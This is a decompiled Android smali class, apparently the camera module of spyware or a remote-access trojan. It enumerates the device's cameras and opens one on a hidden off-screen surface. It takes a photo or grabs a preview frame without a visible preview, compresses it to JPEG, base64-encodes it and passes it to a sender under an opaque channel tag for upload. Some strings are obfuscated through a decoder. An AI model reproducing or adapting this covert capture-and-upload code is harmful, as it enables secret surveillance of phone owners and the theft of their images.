.class public Lcom/piupiupiu/b;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/content/Context;

.field private b:Landroid/hardware/Camera;

.field private c:Landroid/graphics/SurfaceTexture;

.field private final d:Ljava/util/concurrent/atomic/AtomicBoolean;

.field private volatile e:I

.field private volatile f:[B

.field private g:I

.field private h:I

.field private i:I

.field private j:Ljava/lang/String;

.field private k:I


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    iput-object v0, p0, Lcom/piupiupiu/b;->d:Ljava/util/concurrent/atomic/AtomicBoolean;

    iput v1, p0, Lcom/piupiupiu/b;->e:I

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/piupiupiu/b;->f:[B

    iput v1, p0, Lcom/piupiupiu/b;->g:I

    iput v1, p0, Lcom/piupiupiu/b;->h:I

    iput v1, p0, Lcom/piupiupiu/b;->i:I

    const-string v0, "default"

    iput-object v0, p0, Lcom/piupiupiu/b;->j:Ljava/lang/String;

    const/4 v0, -0x1

    iput v0, p0, Lcom/piupiupiu/b;->k:I

    iput-object p1, p0, Lcom/piupiupiu/b;->a:Landroid/content/Context;

    return-void
.end method

.method static synthetic a(Lcom/piupiupiu/b;)I
    .locals 2

    iget v0, p0, Lcom/piupiupiu/b;->e:I

    add-int/lit8 v1, v0, 0x1

    iput v1, p0, Lcom/piupiupiu/b;->e:I

    return v0
.end method

.method static synthetic a(Lcom/piupiupiu/b;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/piupiupiu/b;->a(Ljava/lang/String;)V

    return-void
.end method

.method private a(Ljava/lang/String;)V
    .locals 8

    const/16 v2, 0x11

    iget-object v1, p0, Lcom/piupiupiu/b;->f:[B

    iget v6, p0, Lcom/piupiupiu/b;->e:I

    invoke-direct {p0}, Lcom/piupiupiu/b;->b()V

    if-eqz v1, :cond_0

    iget v0, p0, Lcom/piupiupiu/b;->i:I

    if-ne v0, v2, :cond_0

    iget v0, p0, Lcom/piupiupiu/b;->g:I

    if-lez v0, :cond_0

    iget v0, p0, Lcom/piupiupiu/b;->h:I

    if-lez v0, :cond_0

    :try_start_0
    new-instance v7, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v7}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v0, Landroid/graphics/YuvImage;

    const/16 v2, 0x11

    iget v3, p0, Lcom/piupiupiu/b;->g:I

    iget v4, p0, Lcom/piupiupiu/b;->h:I

    const/4 v5, 0x0

    invoke-direct/range {v0 .. v5}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    new-instance v1, Landroid/graphics/Rect;

    const/4 v2, 0x0

    const/4 v3, 0x0

    iget v4, p0, Lcom/piupiupiu/b;->g:I

    iget v5, p0, Lcom/piupiupiu/b;->h:I

    invoke-direct {v1, v2, v3, v4, v5}, Landroid/graphics/Rect;-><init>(IIII)V

    const/16 v2, 0x46

    invoke-virtual {v0, v1, v2, v7}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    invoke-virtual {v7}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/piupiupiu/b;->a([B)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " (preview frames="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ", fallback failed: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ")"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_1
    const-string v1, "k7f2qa"

    new-instance v2, Ljava/lang/RuntimeException;

    invoke-direct {v2, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    invoke-static {v1, v2}, Lcom/piupiupiu/d;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " (preview frames="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", cam id "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, p0, Lcom/piupiupiu/b;->k:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, p0, Lcom/piupiupiu/b;->g:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "x"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, p0, Lcom/piupiupiu/b;->h:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", fmt "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget v1, p0, Lcom/piupiupiu/b;->i:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", focus "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lcom/piupiupiu/b;->j:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ")"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1
.end method

.method private a([B)V
    .locals 5

    const/4 v4, 0x0

    array-length v0, p1

    invoke-static {p1, v4, v0}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x14

    invoke-virtual {v0, v2, v3, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "image"

    const/4 v3, 0x1

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result v2

    const-string v3, "buffer"

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    invoke-static {v1, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v1

    const-string v3, "k7f2qa"

    invoke-virtual {v1, v3, v0}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Ljava/lang/RuntimeException;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "picture upload failed (jpeg="

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " bytes)"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    throw v0

    :cond_0
    return-void
.end method

.method static synthetic a(Lcom/piupiupiu/b;[B)[B
    .locals 0

    iput-object p1, p0, Lcom/piupiupiu/b;->f:[B

    return-object p1
.end method

.method static synthetic b(Lcom/piupiupiu/b;)Ljava/util/concurrent/atomic/AtomicBoolean;
    .locals 1

    iget-object v0, p0, Lcom/piupiupiu/b;->d:Ljava/util/concurrent/atomic/AtomicBoolean;

    return-object v0
.end method

.method private declared-synchronized b()V
    .locals 1

    monitor-enter p0

    :try_start_0
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    :try_start_1
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_0
    :try_start_2
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :goto_1
    const/4 v0, 0x0

    :try_start_3
    iput-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :cond_0
    monitor-exit p0

    return-void

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0

    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_0
.end method

.method static synthetic b(Lcom/piupiupiu/b;[B)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/piupiupiu/b;->a([B)V

    return-void
.end method

.method static synthetic c(Lcom/piupiupiu/b;)V
    .locals 0

    invoke-direct {p0}, Lcom/piupiupiu/b;->b()V

    return-void
.end method


# virtual methods
.method public a()Lorg/json/JSONObject;
    .locals 9

    const/4 v0, 0x0

    const/4 v8, 0x1

    iget-object v1, p0, Lcom/piupiupiu/b;->a:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const-string v2, "android.hardware.camera"

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    :goto_0
    return-object v0

    :cond_0
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V

    const-string v2, "EyY="

    invoke-static {v2}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x1

    invoke-virtual {v1, v2, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v4

    const/4 v2, 0x0

    :goto_1
    if-ge v2, v4, :cond_3

    new-instance v5, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v5}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {v2, v5}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    iget v6, v5, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v6, v8, :cond_1

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const-string v6, "name"

    const-string v7, "Front"

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v6, "id"

    invoke-virtual {v5, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v3, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_1
    iget v5, v5, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v5, :cond_2

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const-string v6, "name"

    const-string v7, "Back"

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v6, "id"

    invoke-virtual {v5, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v3, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    :cond_2
    :try_start_1
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const-string v6, "name"

    const-string v7, "Other"

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v6, "id"

    invoke-virtual {v5, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v3, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_2

    :cond_3
    const-string v2, "list"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    move-object v0, v1

    goto :goto_0
.end method

.method public a(I)V
    .locals 5

    const/4 v4, 0x0

    iput p1, p0, Lcom/piupiupiu/b;->k:I

    :try_start_0
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_2

    move-result-object v0

    :try_start_2
    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_3

    const-string v2, "continuous-picture"

    invoke-interface {v1, v2}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    const-string v1, "continuous-picture"

    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    :cond_0
    :goto_0
    :try_start_3
    iget-object v1, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v1

    iget v1, v1, Landroid/hardware/Camera$Size;->width:I

    iput v1, p0, Lcom/piupiupiu/b;->g:I

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v1

    iget v1, v1, Landroid/hardware/Camera$Size;->height:I

    iput v1, p0, Lcom/piupiupiu/b;->h:I

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getPreviewFormat()I

    move-result v1

    iput v1, p0, Lcom/piupiupiu/b;->i:I

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getFocusMode()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/piupiupiu/b;->j:Ljava/lang/String;

    new-instance v0, Landroid/graphics/SurfaceTexture;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    iput-object v0, p0, Lcom/piupiupiu/b;->c:Landroid/graphics/SurfaceTexture;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    :try_start_4
    iget-object v0, p0, Lcom/piupiupiu/b;->c:Landroid/graphics/SurfaceTexture;

    iget v1, p0, Lcom/piupiupiu/b;->g:I

    iget v2, p0, Lcom/piupiupiu/b;->h:I

    invoke-virtual {v0, v1, v2}, Landroid/graphics/SurfaceTexture;->setDefaultBufferSize(II)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_5

    :goto_1
    :try_start_5
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    iget-object v1, p0, Lcom/piupiupiu/b;->c:Landroid/graphics/SurfaceTexture;

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    :try_start_6
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    new-instance v1, Lcom/piupiupiu/b$1;

    invoke-direct {v1, p0}, Lcom/piupiupiu/b$1;-><init>(Lcom/piupiupiu/b;)V

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallbackWithBuffer(Landroid/hardware/Camera$PreviewCallback;)V

    iget v0, p0, Lcom/piupiupiu/b;->g:I

    iget v1, p0, Lcom/piupiupiu/b;->h:I

    mul-int/2addr v0, v1

    iget v1, p0, Lcom/piupiupiu/b;->i:I

    invoke-static {v1}, Landroid/graphics/ImageFormat;->getBitsPerPixel(I)I

    move-result v1

    mul-int/2addr v0, v1

    div-int/lit8 v0, v0, 0x8

    if-lez v0, :cond_1

    iget-object v1, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    new-array v2, v0, [B

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->addCallbackBuffer([B)V

    iget-object v1, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    new-array v2, v0, [B

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->addCallbackBuffer([B)V

    iget-object v1, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    new-array v0, v0, [B

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->addCallbackBuffer([B)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_4

    :cond_1
    :goto_2
    :try_start_7
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->startPreview()V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/piupiupiu/b$2;

    invoke-direct {v1, p0}, Lcom/piupiupiu/b$2;-><init>(Lcom/piupiupiu/b;)V

    const-string v2, "cam-watchdog"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :try_start_8
    iget-object v0, p0, Lcom/piupiupiu/b;->b:Landroid/hardware/Camera;

    const/4 v1, 0x0

    const/4 v2, 0x0

    new-instance v3, Lcom/piupiupiu/b$3;

    invoke-direct {v3, p0}, Lcom/piupiupiu/b$3;-><init>(Lcom/piupiupiu/b;)V

    invoke-virtual {v0, v1, v2, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_3

    :cond_2
    :goto_3
    return-void

    :catch_0
    move-exception v0

    const-string v1, "k7f2qa"

    invoke-static {v1, v0}, Lcom/piupiupiu/d;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_3

    :cond_3
    if-eqz v1, :cond_0

    :try_start_9
    const-string v2, "continuous-video"

    invoke-interface {v1, v2}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "continuous-video"

    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v1

    goto/16 :goto_0

    :catch_2
    move-exception v0

    invoke-direct {p0}, Lcom/piupiupiu/b;->b()V

    const-string v1, "k7f2qa"

    invoke-static {v1, v0}, Lcom/piupiupiu/d;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_3

    :catch_3
    move-exception v0

    iget-object v1, p0, Lcom/piupiupiu/b;->d:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v2, 0x1

    invoke-virtual {v1, v4, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;->compareAndSet(ZZ)Z

    move-result v1

    if-eqz v1, :cond_2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "camera capture failed: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/piupiupiu/b;->a(Ljava/lang/String;)V

    goto :goto_3

    :catch_4
    move-exception v0

    goto :goto_2

    :catch_5
    move-exception v0

    goto/16 :goto_1
.end method
